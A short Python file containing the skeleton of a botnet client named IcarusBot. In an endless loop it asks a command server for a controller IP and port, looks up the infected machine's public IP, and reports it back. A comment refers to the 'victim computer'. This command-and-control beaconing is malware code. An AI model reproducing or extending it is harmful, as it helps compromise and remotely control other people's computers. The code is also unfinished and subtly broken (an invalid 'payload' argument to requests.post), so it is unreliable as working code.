# Keen to start
import requests
import socket
import time
from config import API_URL

class IcarusBot():
    """
    A class used to represent the bot
    """
    def __init__(self):
        self.bot_id = 1 # should be random or grabbed somehow from victim computer


    def lookup(self):
        """sends request to nameserver to get command ip and port"""
        r = requests.get(f'{API_URL}/api/lookup/bot/{self.bot_id}')
        if (r.status_code == 200):
            self.command_ip, self.command_port =  r.text.split('::')
            print(self.command_ip)
            print(self.command_port)
    
    def update(self):
        """updates nameserver with ip and port"""
        ip = requests.get('https://api.ipify.org').content.decode('utf8')
        # setting up sockets required for port?
        payload = {'id':self.bot_id,'ip':ip,'port':25565}
        # unsure if get or post request!
        r = requests.post(f'{API_URL}/bot/update', payload=payload)

    def start(self):
        while True:
            self.lookup()
            self.update()
            time.sleep(5) # obviously we will be threading and shit later

def main():
    bot = IcarusBot()
    bot.start()

if __name__ == "__main__":
    main();